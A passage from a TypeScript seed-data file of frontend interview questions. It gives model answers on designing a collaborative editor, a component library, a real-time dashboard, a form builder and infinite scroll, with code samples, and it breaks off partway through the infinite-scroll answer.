// data/seed-data.ts

import type { CreateQuestionInput, QuestionCategory } from "@/types";
import { QUESTION_CATEGORIES } from "@/types";

/**
 * FrontMaster Seed Data
 *
 * High-quality frontend interview questions covering:
 * - System Design & Architecture
 * - Caching & Memoization
 * - Bundle Size & Tree Shaking
 * - Security & Authentication
 * - Feature Flags
 * - CSS & Layout
 * - JavaScript Event Loop
 * - Accessibility
 * - React Internals
 *
 * Each question is crafted to reflect real interview scenarios at
 * top tech companies (Meta, Google, Netflix, Vercel, etc.)
 */

// ============================================================================
// SYSTEM DESIGN & ARCHITECTURE
// ============================================================================

const systemDesignQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "senior",
    question:
      "Design a real-time collaborative text editor like Google Docs. Focus on the frontend architecture, state synchronization, and conflict resolution.",
    answer: `## Overview

A real-time collaborative editor requires careful consideration of state synchronization, conflict resolution, and offline support. The frontend architecture must handle multiple users editing the same document simultaneously.

## Core Architecture

### 1. Operational Transformation (OT) vs CRDTs

Two main approaches for conflict resolution:

**Operational Transformation (OT):**
- Transforms operations against concurrent operations
- Requires a central server for transformation
- Used by Google Docs

**CRDTs (Conflict-free Replicated Data Types):**
- Operations are commutative and idempotent
- Can work peer-to-peer
- Used by Figma, Linear

\`\`\`typescript
// CRDT-based text representation using Yjs
import * as Y from 'yjs';
import { WebsocketProvider } from 'y-websocket';

// Create a shared document
const ydoc = new Y.Doc();

// Define the shared text type
const ytext = ydoc.getText('editor');

// Connect to sync server
const provider = new WebsocketProvider(
  'wss://sync.example.com',
  'document-id',
  ydoc
);

// Local changes automatically sync
ytext.insert(0, 'Hello, World!');
\`\`\`

### 2. State Management Architecture

\`\`\`typescript
interface EditorState {
  // Local document state
  document: DocumentNode;
  
  // Cursor/selection positions of all users
  awareness: Map<UserId, AwarenessState>;
  
  // Pending operations not yet acknowledged
  pendingOps: Operation[];
  
  // Connection state
  connectionStatus: 'connected' | 'reconnecting' | 'offline';
  
  // Undo/redo stacks (local only)
  undoStack: Operation[];
  redoStack: Operation[];
}

interface AwarenessState {
  userId: string;
  userName: string;
  cursor: CursorPosition | null;
  selection: SelectionRange | null;
  color: string;
}
\`\`\`

### 3. Optimistic Updates with Rollback

\`\`\`typescript
class CollaborativeEditor {
  private pendingOps: Operation[] = [];
  private confirmedState: DocumentState;
  private optimisticState: DocumentState;

  applyLocalOperation(op: Operation) {
    // 1. Apply optimistically
    this.optimisticState = applyOperation(this.optimisticState, op);
    
    // 2. Add to pending queue
    this.pendingOps.push(op);
    
    // 3. Send to server
    this.sendToServer(op);
    
    // 4. Re-render immediately
    this.render(this.optimisticState);
  }

  handleServerAck(confirmedOp: Operation) {
    // Remove from pending queue
    this.pendingOps = this.pendingOps.filter(
      op => op.id !== confirmedOp.id
    );
    
    // Update confirmed state
    this.confirmedState = applyOperation(
      this.confirmedState, 
      confirmedOp
    );
  }

  handleRemoteOperation(remoteOp: Operation) {
    // 1. Transform against pending operations
    let transformedOp = remoteOp;
    for (const pendingOp of this.pendingOps) {
      transformedOp = transform(transformedOp, pendingOp);
    }
    
    // 2. Apply to both states
    this.confirmedState = applyOperation(
      this.confirmedState, 
      remoteOp
    );
    this.optimisticState = applyOperation(
      this.optimisticState, 
      transformedOp
    );
    
    // 3. Re-render
    this.render(this.optimisticState);
  }
}
\`\`\`

### 4. WebSocket Connection Management

\`\`\`typescript
class SyncConnection {
  private ws: WebSocket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  private messageQueue: Message[] = [];

  connect() {
    this.ws = new WebSocket(this.url);
    
    this.ws.onopen = () => {
      this.reconnectAttempts = 0;
      this.flushMessageQueue();
    };
    
    this.ws.onclose = () => {
      this.scheduleReconnect();
    };
    
    this.ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
  }

  private scheduleReconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      this.enterOfflineMode();
      return;
    }
    
    // Exponential backoff with jitter
    const delay = Math.min(
      1000 * Math.pow(2, this.reconnectAttempts) + 
      Math.random() * 1000,
      30000
    );
    
    this.reconnectAttempts++;
    setTimeout(() => this.connect(), delay);
  }

  send(message: Message) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(message));
    } else {
      // Queue for when connection restores
      this.messageQueue.push(message);
    }
  }
}
\`\`\`

### 5. Presence and Cursor Rendering

\`\`\`tsx
function CollaboratorCursors({ awareness }: { awareness: AwarenessState[] }) {
  return (
    <>
      {awareness.map((user) => (
        <div
          key={user.userId}
          className="absolute pointer-events-none"
          style={{
            transform: \`translate(\${user.cursor?.x}px, \${user.cursor?.y}px)\`,
          }}
        >
          {/* Cursor caret */}
          <div 
            className="w-0.5 h-5" 
            style={{ backgroundColor: user.color }} 
          />
          {/* User name label */}
          <div
            className="text-xs px-1 rounded whitespace-nowrap"
            style={{ backgroundColor: user.color }}
          >
            {user.userName}
          </div>
        </div>
      ))}
    </>
  );
}
\`\`\`

## Key Considerations

1. **Offline Support**: Queue operations locally, sync when reconnected
2. **Undo/Redo**: Must be local-only, not affect other users
3. **Large Documents**: Virtualize rendering, lazy-load sections
4. **Performance**: Debounce awareness updates, batch operations
5. **Security**: Validate operations server-side, sanitize content`,
    keyPoints: [
      "Understands OT vs CRDT trade-offs",
      "Can explain optimistic updates with conflict resolution",
      "Knows WebSocket reconnection patterns with exponential backoff",
      "Considers offline support and local-first architecture",
      "Addresses presence/awareness for multi-user UX",
      "Mentions virtualization for large documents",
    ],
    followUpQuestions: [
      "How would you handle undo/redo in a collaborative context?",
      "What happens when a user has been offline for hours and reconnects?",
      "How would you implement cursor smoothing for remote users?",
      "How would you optimize for a document with 10,000+ users viewing?",
    ],
    relatedTopics: [
      "websockets",
      "crdt",
      "operational-transformation",
      "optimistic-updates",
    ],
    source: "seed",
    commonAt: ["Google", "Notion", "Figma", "Linear"],
  },
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "senior",
    question:
      "Design a component library that will be used by 50+ teams across your organization. How would you architect it for scalability, versioning, and adoption?",
    answer: `## Overview

A shared component library at scale requires careful architecture around versioning, documentation, testing, and developer experience. The goal is to maximize adoption while maintaining quality and consistency.

## Architecture Decisions

### 1. Monorepo Structure

\`\`\`
packages/
┌── @company/components/        # Core component library
│   ┌── src/
│   │   ┌── components/
│   │   │   ┌── Button/
│   │   │   │   ┌── Button.tsx
│   │   │   │   ┌── Button.test.tsx
│   │   │   │   ┌── Button.stories.tsx
│   │   │   │   └── index.ts
│   │   │   └── ...
│   │   ┌── hooks/
│   │   ┌── utils/
│   │   └── index.ts
│   └── package.json
┌── @company/tokens/            # Design tokens
│   ┌── src/
│   │   ┌── colors.ts
│   │   ┌── spacing.ts
│   │   ┌── typography.ts
│   │   └── index.ts
│   └── package.json
┌── @company/icons/             # Icon library
└── @company/themes/            # Theme presets
\`\`\`

### 2. Component API Design Philosophy

\`\`\`typescript
// Compound component pattern for flexibility
import { Button } from '@company/components';

// Simple usage
<Button>Click me</Button>

// Advanced usage with compound components
<Button.Group>
  <Button variant="primary">Save</Button>
  <Button variant="secondary">Cancel</Button>
</Button.Group>

// Polymorphic component for semantic HTML
<Button as="a" href="/dashboard">
  Go to Dashboard
</Button>
\`\`\`

### 3. Polymorphic Component Implementation

\`\`\`typescript
import { forwardRef, type ElementType, type ComponentPropsWithoutRef } from 'react';

type PolymorphicProps<E extends ElementType, P = object> = P & {
  as?: E;
} & Omit<ComponentPropsWithoutRef<E>, keyof P | 'as'>;

type ButtonOwnProps = {
  variant?: 'primary' | 'secondary' | 'ghost';
  size?: 'sm' | 'md' | 'lg';
  isLoading?: boolean;
};

type ButtonProps<E extends ElementType = 'button'> = PolymorphicProps<E, ButtonOwnProps>;

export const Button = forwardRef(function Button<E extends ElementType = 'button'>(
  { as, variant = 'primary', size = 'md', isLoading, children, ...props }: ButtonProps<E>,
  ref: React.Ref<Element>
) {
  const Component = as || 'button';
  
  return (
    <Component
      ref={ref}
      className={cn(
        buttonVariants({ variant, size }),
        isLoading && 'opacity-50 cursor-not-allowed'
      )}
      disabled={isLoading}
      {...props}
    >
      {isLoading ? <Spinner size={size} /> : children}
    </Component>
  );
}) as <E extends ElementType = 'button'>(
  props: ButtonProps<E> & { ref?: React.Ref<Element> }
) => React.ReactElement | null;
\`\`\`

### 4. Design Token System

\`\`\`typescript
// tokens/colors.ts
export const colors = {
  primary: {
    50: '#eff6ff',
    100: '#dbeafe',
    // ...
    900: '#1e3a8a',
  },
  semantic: {
    success: 'var(--color-success)',
    warning: 'var(--color-warning)',
    error: 'var(--color-error)',
    info: 'var(--color-info)',
  },
} as const;

// Generate CSS custom properties
export function generateCSSVariables(tokens: typeof colors) {
  return Object.entries(flattenTokens(tokens))
    .map(([key, value]) => \`--\${key}: \${value};\`)
    .join('\\n');
}
\`\`\`

### 5. Versioning Strategy

\`\`\`json
{
  "name": "@company/components",
  "version": "2.4.1",
  "peerDependencies": {
    "react": "^18.0.0",
    "react-dom": "^18.0.0"
  }
}
\`\`\`

**Semantic Versioning Rules:**
- **Major**: Breaking API changes, removed components
- **Minor**: New components, new props (backward compatible)
- **Patch**: Bug fixes, style adjustments

**Migration Strategy:**
\`\`\`typescript
// Deprecation pattern
/** @deprecated Use \`variant="primary"\` instead. Will be removed in v3.0 */
export interface ButtonProps {
  /** @deprecated */
  primary?: boolean;
  variant?: 'primary' | 'secondary';
}

function Button({ primary, variant, ...props }: ButtonProps) {
  if (primary !== undefined) {
    console.warn(
      '[@company/components] Button: "primary" prop is deprecated. ' +
      'Use variant="primary" instead.'
    );
  }
  
  const resolvedVariant = variant ?? (primary ? 'primary' : 'secondary');
  // ...
}
\`\`\`

### 6. Testing Strategy

\`\`\`typescript
// Visual regression with Chromatic/Percy
// Unit tests with Testing Library
// Accessibility tests with jest-axe

import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { axe, toHaveNoViolations } from 'jest-axe';

expect.extend(toHaveNoViolations);

describe('Button', () => {
  it('renders correctly', () => {
    render(<Button>Click me</Button>);
    expect(screen.getByRole('button', { name: 'Click me' })).toBeInTheDocument();
  });

  it('handles click events', async () => {
    const onClick = vi.fn();
    render(<Button onClick={onClick}>Click me</Button>);
    
    await userEvent.click(screen.getByRole('button'));
    expect(onClick).toHaveBeenCalledTimes(1);
  });

  it('has no accessibility violations', async () => {
    const { container } = render(<Button>Click me</Button>);
    const results = await axe(container);
    expect(results).toHaveNoViolations();
  });
});
\`\`\`

### 7. Documentation with Storybook

\`\`\`typescript
// Button.stories.tsx
import type { Meta, StoryObj } from '@storybook/react';
import { Button } from './Button';

const meta: Meta<typeof Button> = {
  title: 'Components/Button',
  component: Button,
  tags: ['autodocs'],
  argTypes: {
    variant: {
      control: 'select',
      options: ['primary', 'secondary', 'ghost'],
    },
  },
};

export default meta;
type Story = StoryObj<typeof Button>;

export const Primary: Story = {
  args: {
    children: 'Primary Button',
    variant: 'primary',
  },
};

export const AllVariants: Story = {
  render: () => (
    <div className="flex gap-4">
      <Button variant="primary">Primary</Button>
      <Button variant="secondary">Secondary</Button>
      <Button variant="ghost">Ghost</Button>
    </div>
  ),
};
\`\`\`

## Adoption Strategy

1. **Champions Program**: Identify early adopters in each team
2. **Migration Codemods**: Automated migration scripts
3. **Metrics Dashboard**: Track adoption, bundle size impact
4. **Office Hours**: Regular support sessions
5. **Feedback Loop**: GitHub discussions, Slack channel`,
    keyPoints: [
      "Understands monorepo structure benefits",
      "Can implement polymorphic components with TypeScript",
      "Knows semantic versioning and deprecation patterns",
      "Emphasizes testing (unit, visual regression, a11y)",
      "Considers developer experience and adoption",
      "Mentions design tokens for consistency",
    ],
    followUpQuestions: [
      "How would you handle a breaking change that affects 50 teams?",
      "How do you ensure bundle size doesn't bloat for teams using few components?",
      "How would you implement theming for different brand guidelines?",
      "What metrics would you track to measure library success?",
    ],
    relatedTopics: [
      "monorepo",
      "semantic-versioning",
      "storybook",
      "design-tokens",
    ],
    source: "seed",
    commonAt: ["Shopify", "Airbnb", "Uber", "Atlassian"],
  },
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "senior",
    question:
      "Design a frontend architecture for a dashboard that displays real-time metrics from 100+ data sources, with customizable widgets and layouts.",
    answer: `## Overview

A real-time dashboard with 100+ data sources requires careful architecture around data aggregation, efficient rendering, and user customization. Key challenges include managing WebSocket connections, preventing UI jank, and persisting user layouts.

## Architecture Overview

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    Dashboard Shell                           │
┌─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   Widget    │  │   Widget    │  │   Widget    │         │
│  │  (Chart)    │  │  (Table)    │  │   (KPI)     │         │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘         │
│         │                │                │                 │
│  ┌──────┬────────────────┬────────────────┬──────┐         │
│  │            Data Subscription Layer            │         │
│  └──────────────────────┬────────────────────────┘         │
│                         │                                   │
│  ┌──────────────────────┬────────────────────────┐         │
│  │         WebSocket Connection Manager          │         │
│  └──────────────────────┬────────────────────────┘         │
└─────────────────────────┼───────────────────────────────────┘
                          │
                    ┌─────┬─────┐
                    │  Gateway  │  (Aggregates 100+ sources)
                    └───────────┘
\`\`\`

## Core Components

### 1. Data Subscription System

\`\`\`typescript
// Pub/sub pattern for efficient data distribution
type Subscriber<T> = (data: T) => void;

class DataSubscriptionManager {
  private subscriptions = new Map<string, Set<Subscriber<unknown>>>();
  private latestData = new Map<string, unknown>();
  private ws: WebSocket | null = null;

  subscribe<T>(channel: string, callback: Subscriber<T>): () => void {
    if (!this.subscriptions.has(channel)) {
      this.subscriptions.set(channel, new Set());
      this.requestChannel(channel);
    }
    
    this.subscriptions.get(channel)!.add(callback as Subscriber<unknown>);
    
    // Immediately call with latest data if available
    if (this.latestData.has(channel)) {
      callback(this.latestData.get(channel) as T);
    }
    
    // Return unsubscribe function
    return () => {
      const subs = this.subscriptions.get(channel);
      if (subs) {
        subs.delete(callback as Subscriber<unknown>);
        if (subs.size === 0) {
          this.subscriptions.delete(channel);
          this.releaseChannel(channel);
        }
      }
    };
  }

  private handleMessage(event: MessageEvent) {
    const { channel, data } = JSON.parse(event.data);
    this.latestData.set(channel, data);
    
    const subscribers = this.subscriptions.get(channel);
    if (subscribers) {
      // Batch updates to prevent excessive re-renders
      queueMicrotask(() => {
        subscribers.forEach(callback => callback(data));
      });
    }
  }

  private requestChannel(channel: string) {
    this.ws?.send(JSON.stringify({ type: 'subscribe', channel }));
  }

  private releaseChannel(channel: string) {
    this.ws?.send(JSON.stringify({ type: 'unsubscribe', channel }));
  }
}

// React hook for subscriptions
function useDataSubscription<T>(channel: string): T | null {
  const [data, setData] = useState<T | null>(null);
  const manager = useContext(DataManagerContext);

  useEffect(() => {
    return manager.subscribe<T>(channel, setData);
  }, [channel, manager]);

  return data;
}
\`\`\`

### 2. Virtualized Widget Grid

\`\`\`typescript
// Only render widgets in viewport
import { useVirtualizer } from '@tanstack/react-virtual';

interface Widget {
  id: string;
  type: WidgetType;
  position: { x: number; y: number; w: number; h: number };
  config: WidgetConfig;
}

function DashboardGrid({ widgets }: { widgets: Widget[] }) {
  const parentRef = useRef<HTMLDivElement>(null);
  
  // Calculate which widgets are visible
  const visibleWidgets = useMemo(() => {
    return widgets.filter(widget => 
      isInViewport(widget.position, viewportBounds)
    );
  }, [widgets, viewportBounds]);

  return (
    <div 
      ref={parentRef}
      className="relative w-full h-full overflow-auto"
    >
      {visibleWidgets.map(widget => (
        <WidgetContainer
          key={widget.id}
          widget={widget}
          style={{
            position: 'absolute',
            left: widget.position.x * GRID_SIZE,
            top: widget.position.y * GRID_SIZE,
            width: widget.position.w * GRID_SIZE,
            height: widget.position.h * GRID_SIZE,
          }}
        />
      ))}
    </div>
  );
}
\`\`\`

### 3. Widget Component Architecture

\`\`\`typescript
// Widget registry pattern
const WIDGET_REGISTRY: Record<WidgetType, React.LazyExoticComponent<WidgetComponent>> = {
  'line-chart': lazy(() => import('./widgets/LineChartWidget')),
  'bar-chart': lazy(() => import('./widgets/BarChartWidget')),
  'kpi-card': lazy(() => import('./widgets/KPICardWidget')),
  'data-table': lazy(() => import('./widgets/DataTableWidget')),
  'heatmap': lazy(() => import('./widgets/HeatmapWidget')),
};

interface WidgetProps<T = unknown> {
  config: T;
  data: unknown;
  isEditing: boolean;
  onConfigChange: (config: T) => void;
}

function WidgetContainer({ widget }: { widget: Widget }) {
  const data = useDataSubscription(widget.config.dataSource);
  const Component = WIDGET_REGISTRY[widget.type];

  return (
    <ErrorBoundary fallback={<WidgetError />}>
      <Suspense fallback={<WidgetSkeleton />}>
        <Component
          config={widget.config}
          data={data}
          isEditing={false}
          onConfigChange={() => {}}
        />
      </Suspense>
    </ErrorBoundary>
  );
}
\`\`\`

### 4. Layout Persistence

\`\`\`typescript
// Layout state with optimistic updates
interface DashboardLayout {
  id: string;
  name: string;
  widgets: Widget[];
  gridConfig: GridConfig;
  updatedAt: string;
}

async function saveLayout(layout: DashboardLayout): Promise<void> {
  // Debounced auto-save
  await fetch('/api/layouts/' + layout.id, {
    method: 'PUT',
    body: JSON.stringify(layout),
  });
}

// Zustand store for layout state
const useDashboardStore = create<DashboardStore>()(
  persist(
    (set, get) => ({
      layout: null,
      isDirty: false,
      
      updateWidgetPosition: (widgetId, position) => {
        set(state => ({
          layout: {
            ...state.layout!,
            widgets: state.layout!.widgets.map(w =>
              w.id === widgetId ? { ...w, position } : w
            ),
          },
          isDirty: true,
        }));
        
        // Debounced save
        debouncedSave(get().layout!);
      },
      
      addWidget: (type, config) => {
        const widget: Widget = {
          id: nanoid(),
          type,
          position: findEmptyPosition(get().layout!.widgets),
          config,
        };
        
        set(state => ({
          layout: {
            ...state.layout!,
            widgets: [...state.layout!.widgets, widget],
          },
          isDirty: true,
        }));
      },
    }),
    {
      name: 'dashboard-layout',
      storage: createJSONStorage(() => localStorage),
    }
  )
);
\`\`\`

### 5. Performance Optimizations

\`\`\`typescript
// 1. Throttle high-frequency updates
function useThrottledData<T>(channel: string, interval = 100): T | null {
  const rawData = useDataSubscription<T>(channel);
  const [throttledData, setThrottledData] = useState<T | null>(null);
  
  useEffect(() => {
    const timer = setInterval(() => {
      setThrottledData(rawData);
    }, interval);
    
    return () => clearInterval(timer);
  }, [rawData, interval]);
  
  return throttledData;
}

// 2. Web Worker for data transformation
const chartWorker = new Worker(
  new URL('./workers/chart-transform.worker.ts', import.meta.url)
);

function useTransformedData(rawData: DataPoint[], config: TransformConfig) {
  const [result, setResult] = useState<TransformedData | null>(null);
  
  useEffect(() => {
    chartWorker.postMessage({ rawData, config });
    
    const handler = (e: MessageEvent) => setResult(e.data);
    chartWorker.addEventListener('message', handler);
    
    return () => chartWorker.removeEventListener('message', handler);
  }, [rawData, config]);
  
  return result;
}

// 3. Memoized chart rendering
const LineChartWidget = memo(function LineChartWidget({ 
  data, 
  config 
}: WidgetProps<LineChartConfig>) {
  const chartData = useTransformedData(data, config.transform);
  
  return (
    <ResponsiveContainer>
      <LineChart data={chartData}>
        {/* Chart configuration */}
      </LineChart>
    </ResponsiveContainer>
  );
}, (prev, next) => {
  // Custom comparison - only re-render if data changed significantly
  return isEqual(prev.data, next.data) && isEqual(prev.config, next.config);
});
\`\`\`

## Key Considerations

1. **Connection Multiplexing**: Single WebSocket with channel subscriptions
2. **Backpressure Handling**: Drop frames if UI can't keep up
3. **Offline Mode**: Cache last known values, show stale indicators
4. **Memory Management**: Limit data history, use ring buffers
5. **Accessibility**: Ensure widgets are keyboard navigable`,
    keyPoints: [
      "Understands pub/sub pattern for data distribution",
      "Implements proper cleanup with unsubscribe functions",
      "Uses virtualization for large widget grids",
      "Knows code-splitting with lazy loading",
      "Applies throttling/debouncing for high-frequency updates",
      "Considers Web Workers for heavy computation",
    ],
    followUpQuestions: [
      "How would you handle a widget that needs data from multiple sources?",
      "What if the WebSocket connection is unreliable?",
      "How would you implement dashboard sharing between users?",
      "How do you handle widgets that crash without affecting others?",
    ],
    relatedTopics: [
      "websockets",
      "virtualization",
      "code-splitting",
      "state-management",
    ],
    source: "seed",
    commonAt: ["Datadog", "Grafana", "New Relic", "Splunk"],
  },
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "mid",
    question:
      "How would you architect a form builder that allows users to create complex, multi-step forms with validation, conditional logic, and file uploads?",
    answer: `## Overview

A form builder requires a flexible schema-driven architecture that separates form definition from rendering. The key is designing a JSON schema that can express complex field relationships while keeping the runtime performant.

## Core Data Model

\`\`\`typescript
// Form schema that drives the entire UI
interface FormSchema {
  id: string;
  title: string;
  steps: FormStep[];
  settings: FormSettings;
}

interface FormStep {
  id: string;
  title: string;
  description?: string;
  fields: FormField[];
  conditions?: StepCondition[]; // When to show this step
}

type FormField = 
  | TextField 
  | SelectField 
  | FileField 
  | GroupField
  | RepeaterField;

interface BaseField {
  id: string;
  type: string;
  label: string;
  required?: boolean;
  helpText?: string;
  conditions?: FieldCondition[];
  validation?: ValidationRule[];
}

interface TextField extends BaseField {
  type: 'text' | 'email' | 'tel' | 'textarea';
  placeholder?: string;
  minLength?: number;
  maxLength?: number;
  pattern?: string;
}

interface SelectField extends BaseField {
  type: 'select' | 'radio' | 'checkbox';
  options: SelectOption[];
  multiple?: boolean;
}

interface FileField extends BaseField {
  type: 'file';
  accept?: string[];
  maxSize?: number; // bytes
  maxFiles?: number;
}

interface GroupField extends BaseField {
  type: 'group';
  fields: FormField[]; // Nested fields
}

interface RepeaterField extends BaseField {
  type: 'repeater';
  fields: FormField[]; // Template for each item
  minItems?: number;
  maxItems?: number;
}
\`\`\`

## Conditional Logic Engine

\`\`\`typescript
interface FieldCondition {
  field: string; // Field ID to watch
  operator: 'equals' | 'notEquals' | 'contains' | 'greaterThan' | 'isEmpty';
  value: unknown;
  action: 'show' | 'hide' | 'require' | 'disable';
}

function evaluateCondition(
  condition: FieldCondition,
  formValues: Record<string, unknown>
): boolean {
  const fieldValue = formValues[condition.field];
  
  switch (condition.operator) {
    case 'equals':
      return fieldValue === condition.value;
    case 'notEquals':
      return fieldValue !== condition.value;
    case 'contains':
      return String(fieldValue).includes(String(condition.value));
    case 'greaterThan':
      return Number(fieldValue) > Number(condition.value);
    case 'isEmpty':
      return !fieldValue || (Array.isArray(fieldValue) && fieldValue.length === 0);
    default:
      return true;
  }
}

function useConditionalFields(
  fields: FormField[],
  formValues: Record<string, unknown>
): FormField[] {
  return useMemo(() => {
    return fields.filter(field => {
      if (!field.conditions?.length) return true;
      
      return field.conditions.every(condition => {
        const result = evaluateCondition(condition, formValues);
        return condition.action === 'show' ? result : !result;
      });
    });
  }, [fields, formValues]);
}
\`\`\`

## Validation System

\`\`\`typescript
import { z } from 'zod';

interface ValidationRule {
  type: 'required' | 'minLength' | 'maxLength' | 'pattern' | 'custom';
  value?: unknown;
  message: string;
}

// Generate Zod schema from field definition
function createFieldSchema(field: FormField): z.ZodTypeAny {
  let schema: z.ZodTypeAny;
  
  switch (field.type) {
    case 'text':
    case 'email':
    case 'tel':
    case 'textarea':
      schema = z.string();
      if (field.type === 'email') {
        schema = (schema as z.ZodString).email(field.validation?.find(v => v.type === 'pattern')?.message);
      }
      if (field.minLength) {
        schema = (schema as z.ZodString).min(field.minLength);
      }
      if (field.maxLength) {
        schema = (schema as z.ZodString).max(field.maxLength);
      }
      break;
      
    case 'select':
    case 'radio':
      schema = z.string();
      break;
      
    case 'checkbox':
      schema = field.multiple ? z.array(z.string()) : z.boolean();
      break;
      
    case 'file':
      schema = z.array(z.instanceof(File)).max(field.maxFiles ?? 10);
      break;
      
    case 'repeater':
      const itemSchema = z.object(
        Object.fromEntries(
          field.fields.map(f => [f.id, createFieldSchema(f)])
        )
      );
      schema = z.array(itemSchema);
      if (field.minItems) schema = (schema as z.ZodArray<typeof itemSchema>).min(field.minItems);
      if (field.maxItems) schema = (schema as z.ZodArray<typeof itemSchema>).max(field.maxItems);
      break;
      
    default:
      schema = z.unknown();
  }
  
  return field.required ? schema : schema.optional();
}

function createFormSchema(formSchema: FormSchema): z.ZodObject<Record<string, z.ZodTypeAny>> {
  const fields = formSchema.steps.flatMap(step => step.fields);
  const shape: Record<string, z.ZodTypeAny> = {};
  
  for (const field of fields) {
    shape[field.id] = createFieldSchema(field);
  }
  
  return z.object(shape);
}
\`\`\`

## File Upload Handling

\`\`\`typescript
interface UploadProgress {
  fileId: string;
  fileName: string;
  progress: number;
  status: 'pending' | 'uploading' | 'complete' | 'error';
  url?: string;
  error?: string;
}

function useFileUpload(fieldId: string) {
  const [uploads, setUploads] = useState<Map<string, UploadProgress>>(new Map());
  
  const uploadFile = useCallback(async (file: File) => {
    const fileId = nanoid();
    
    // Add to state
    setUploads(prev => new Map(prev).set(fileId, {
      fileId,
      fileName: file.name,
      progress: 0,
      status: 'pending',
    }));
    
    try {
      // Get presigned URL
      const { uploadUrl, fileUrl } = await getPresignedUrl(file.name, file.type);
      
      // Upload with progress tracking
      await uploadWithProgress(uploadUrl, file, (progress) => {
        setUploads(prev => {
          const updated = new Map(prev);
          const current = updated.get(fileId)!;
          updated.set(fileId, { ...current, progress, status: 'uploading' });
          return updated;
        });
      });
      
      // Mark complete
      setUploads(prev => {
        const updated = new Map(prev);
        const current = updated.get(fileId)!;
        updated.set(fileId, { ...current, progress: 100, status: 'complete', url: fileUrl });
        return updated;
      });
      
      return fileUrl;
    } catch (error) {
      setUploads(prev => {
        const updated = new Map(prev);
        const current = updated.get(fileId)!;
        updated.set(fileId, { 
          ...current, 
          status: 'error', 
          error: error instanceof Error ? error.message : 'Upload failed' 
        });
        return updated;
      });
      throw error;
    }
  }, []);
  
  return { uploads, uploadFile };
}

async function uploadWithProgress(
  url: string,
  file: File,
  onProgress: (progress: number) => void
): Promise<void> {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    
    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });
    
    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        resolve();
      } else {
        reject(new Error(\`Upload failed: \${xhr.status}\`));
      }
    });
    
    xhr.addEventListener('error', () => reject(new Error('Network error')));
    
    xhr.open('PUT', url);
    xhr.send(file);
  });
}
\`\`\`

## Multi-Step Form Navigation

\`\`\`typescript
function useMultiStepForm(schema: FormSchema) {
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [formData, setFormData] = useState<Record<string, unknown>>({});
  const [stepErrors, setStepErrors] = useState<Record<number, Record<string, string>>>({});
  
  const visibleSteps = useMemo(() => {
    return schema.steps.filter(step => {
      if (!step.conditions?.length) return true;
      return step.conditions.every(c => evaluateCondition(c, formData));
    });
  }, [schema.steps, formData]);
  
  const currentStep = visibleSteps[currentStepIndex];
  const isFirstStep = currentStepIndex === 0;
  const isLastStep = currentStepIndex === visibleSteps.length - 1;
  
  const validateCurrentStep = useCallback(() => {
    const stepFields = currentStep.fields;
    const stepSchema = z.object(
      Object.fromEntries(stepFields.map(f => [f.id, createFieldSchema(f)]))
    );
    
    const result = stepSchema.safeParse(formData);
    
    if (!result.success) {
      const errors: Record<string, string> = {};
      result.error.issues.forEach(issue => {
        if (issue.path[0]) {
          errors[issue.path[0].toString()] = issue.message;
        }
      });
      setStepErrors(prev => ({ ...prev, [currentStepIndex]: errors }));
      return false;
    }
    
    setStepErrors(prev => ({ ...prev, [currentStepIndex]: {} }));
    return true;
  }, [currentStep, currentStepIndex, formData]);
  
  const goNext = useCallback(() => {
    if (validateCurrentStep() && !isLastStep) {
      setCurrentStepIndex(prev => prev + 1);
    }
  }, [validateCurrentStep, isLastStep]);
  
  const goPrev = useCallback(() => {
    if (!isFirstStep) {
      setCurrentStepIndex(prev => prev - 1);
    }
  }, [isFirstStep]);
  
  return {
    currentStep,
    currentStepIndex,
    visibleSteps,
    formData,
    setFormData,
    stepErrors: stepErrors[currentStepIndex] ?? {},
    isFirstStep,
    isLastStep,
    goNext,
    goPrev,
    validateCurrentStep,
  };
}
\`\`\`

## Key Architecture Decisions

1. **Schema-Driven**: Form definition is pure data, enabling storage and reuse
2. **Dynamic Validation**: Zod schemas generated at runtime from field definitions
3. **Isolated File Uploads**: Each file uploads independently with progress tracking
4. **Conditional Logic**: Evaluated on every form value change
5. **Step Validation**: Validates only visible fields in current step`,
    keyPoints: [
      "Uses schema-driven architecture for flexibility",
      "Implements dynamic Zod schema generation",
      "Handles conditional logic with evaluation engine",
      "Manages file uploads with progress tracking",
      "Separates step validation from form validation",
    ],
    followUpQuestions: [
      "How would you handle autosave for partially completed forms?",
      "How would you implement form analytics to track drop-off points?",
      "How would you support offline form completion?",
      "How would you make the form builder itself accessible?",
    ],
    relatedTopics: [
      "form-validation",
      "zod",
      "file-upload",
      "conditional-logic",
    ],
    source: "seed",
    commonAt: ["Typeform", "JotForm", "Airtable"],
  },
  {
    category: QUESTION_CATEGORIES.SYSTEM_DESIGN,
    difficulty: "mid",
    question:
      "Explain how you would implement infinite scroll in a way that handles tens of thousands of items efficiently. What are the trade-offs compared to pagination?",
    answer: `## Overview

Infinite scroll for large datasets requires virtualization - only rendering items that are visible in the viewport plus a buffer zone. This prevents DOM node explosion while maintaining scroll physics.

## Virtualization Implementation

\`\`\`typescript
import { useVirtualizer } from '@tanstack/react-virtual';
import { useInfiniteQuery } from '@tanstack/react-query';

interface Item {
  id: string;
  title: string;
  // ... other fields
}

function VirtualizedInfiniteList() {
  const parentRef = useRef<HTMLDivElement>(null);
  
  // Fetch data in pages
  const {
    data,
    fetchNextPage,
    hasNextPage,
